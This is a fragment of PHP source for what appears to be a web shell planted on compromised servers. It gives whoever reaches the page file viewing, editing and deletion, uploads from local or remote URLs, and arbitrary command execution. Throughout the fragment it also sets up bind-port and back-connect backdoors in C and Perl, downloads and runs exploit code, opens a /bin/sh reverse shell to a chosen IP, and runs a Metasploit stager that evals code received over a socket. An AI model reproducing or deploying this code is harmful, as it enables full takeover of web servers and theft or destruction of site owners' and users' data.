if(isset($_GET['type']) && ($_GET['type']=='image')){echo "<div style='text-align:center;margin:8px;'><img src='?y=".$pwd."&amp;img=".$filn."'></div>";} 
elseif(isset($_GET['type']) && ($_GET['type']=='code')){echo "<div class='viewfile'>";$file = wordwrap(@file_get_contents($file),"240","\n");@highlight_string($file);echo "</div>";} else {echo "<div class='viewfile'>";echo nl2br(htmlentities((@file_get_contents($file))));echo "</div>";}}elseif(is_dir($_GET['view'])){echo showdir($pwd,$prompt);}}
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){if(isset($_POST['save'])){$file = $_POST['saveas'];$content = magicboom($_POST['content']);if($filez = @fopen($file,"w")){$time = date("d-M-Y H:i",time());if(@fwrite($filez,$content)) $msg = "file saved <span class='gaya'>@</span> ".$time;else $msg = "failed to save";@fclose($filez);}else $msg = "permission denied";}if(!isset($file))$file = $_GET['edit'];if($filez = @fopen($file,"r")){$content = "";
while(!feof($filez)){$content .= htmlentities(str_replace("''","'",fgets($filez)));}
@fclose($filez);}?><form action="?y=<?php echo $pwd;?>&amp;edit=<?php echo $file;?>" method="post"> <table class="cmdbox"> <tr><td colspan="2"> 
<textarea class="output" name="content"> 
<?php echo $content;?></textarea> <tr>
<td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file;?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg;?></td></tr></table></form> <?php } 
elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){if(isset($_POST['uploadcomp'])){if(is_uploaded_file($_FILES['file']['tmp_name'])){$path = magicboom($_POST['path']);$fname = $_FILES['file']['name'];$tmp_name = $_FILES['file']['tmp_name'];$pindah = $path.$fname;$stat = @move_uploaded_file($tmp_name,$pindah);if ($stat) {$msg = "file uploaded to $pindah";} else $msg = "failed to upload $fname";}else $msg = "failed to upload $fname";} 
elseif(isset($_POST['uploadurl'])){$pilihan = trim($_POST['pilihan']);$wurl = trim($_POST['wurl']);$path = magicboom($_POST['path']);$namafile = download($pilihan,$wurl);$pindah = $path.$namafile;if(is_file($pindah)){$msg = "file uploaded to $pindah";}else $msg ="failed to upload $namafile";}?><br><br><center><div class="mybox"><form action="?y=<?php echo $pwd;?>&amp;x=upload" enctype="multipart/form-data" method="post"><h1 class="k2ll33d2">Upload Files To The Server</h1><table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Local</th></tr> <tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" />&nbsp;<input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd;?>" /></td></tr> </tr> </table></form><br><table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Remote</th></tr> <tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd;?>&amp;x=upload"> <table><tr><td>link</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://site/file.*"></td></tr> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd;?>" /></td></tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg;?></div></div></center>
<?php }
elseif(isset($_GET['x']) && ($_GET['x'] == 'back')){
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {$port = trim($_POST['port']);$passwrd = trim($_POST['bind_pass']);tulis("bdc.c",$port_bind_bd_c);exe("gcc -o bdc bdc.c");exe("chmod 777 bdc");@unlink("bdc.c");exe("./bdc ".$port." ".$passwrd." &");$scan = exe("ps aux");if(eregi("./bdc $por",$scan)){$msg = "<p>Process successed</p>";} else {$msg = "<p>Process Failed</p>";}} 
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {$port = trim($_POST['port']);$passwrd = trim($_POST['bind_pass']);tulis("bdp",$port_bind_bd_pl);exe("chmod 777 bdp");$p2=which("perl");exe($p2." bdp ".$port." &");$scan = exe("ps aux");if(eregi("$p2 bdp $port",$scan)){$msg = "<p>Process successed</p>";} else {$msg = "<p>Process Failed</p>";} } 
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {$ip = trim($_POST['ip']);$port = trim($_POST['backport']);tulis("bcc.c",$back_connect_c);exe("gcc -o bcc bcc.c");exe("chmod 777 bcc");@unlink("bcc.c");exe("./bcc ".$ip." ".$port." &");$msg = "trying to connect to ".$ip." on port ".$port." ...";} 
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
$ip = trim($_POST['ip']);$port = trim($_POST['backport']);tulis("bcp",$back_connect);
exe("chmod +x bcp");$p2=which("perl");exe($p2." bcp ".$ip." ".$port." &");
$msg = "Trying to connect to ".$ip." on port ".$port." ...";}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {$pilihan = trim($_POST['pilihan']);$wurl = trim($_POST['wurl']);$namafile = download($pilihan,$wurl);
if(is_file($namafile)){$msg = exe($wcmd);}
else $msg = "error: file not found $namafile";}?><br><br><br><br> <table class="tabnet"> <tr><th>Bind Port</th><th>Back connect</th><th>download and Exec</th></tr><tr><td> <table> <form method="post" actions="?y=<?php echo $pwd;?>&amp;x=back"><tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr> <tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass;?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form></table> </td> <td><table> <form method="post" actions="?y=<?php echo $pwd;?>&amp;x=back"><tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"));?>"></td></tr> <tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport;?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form></table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd;?>&amp;x=back"><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr><tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td> </tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option><option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td></tr></table><div style="text-align:center;margin:2px;"><?php echo $msg;?></div><br>
<?php
error_reporting(0);
function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
$s_my_ip = $_SERVER['REMOTE_ADDR'];$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = "<center><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='back'><table class='myboxtbl'><tr><td style='width:100px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td></div><br><div class='mybox'><td><form method='POST'><table class='myboxtbl'><h2>Metasploit Connection </h2><tr><td style='width:100px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center>";
echo $s_result;
if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}} elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){?> 
<form action="?y=<?php echo $pwd;?>&amp;x=shell" method="post"> <table class="cmdbox"> <tr><td colspan="2">
<textarea class="output" readonly>
<?php if(isset($_POST['submitcmd'])) {echo @exe($_POST['cmd']);} ?> 
</textarea> <tr><td colspan="2"><?php echo $prompt;?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Do !" name="submitcmd" style="width:12%;" /></td></tr> </table></form> 
<?php }else{if(isset($_GET['delete']) && ($_GET['delete'] != "")){$file = $_GET['delete'];@unlink($file);} 
elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));}
elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){$path = $pwd.$_GET['mkdir'];@mkdir($path);}$buff = showdir($pwd,$prompt);echo $buff;}
echo "</div></body></html> ";
?>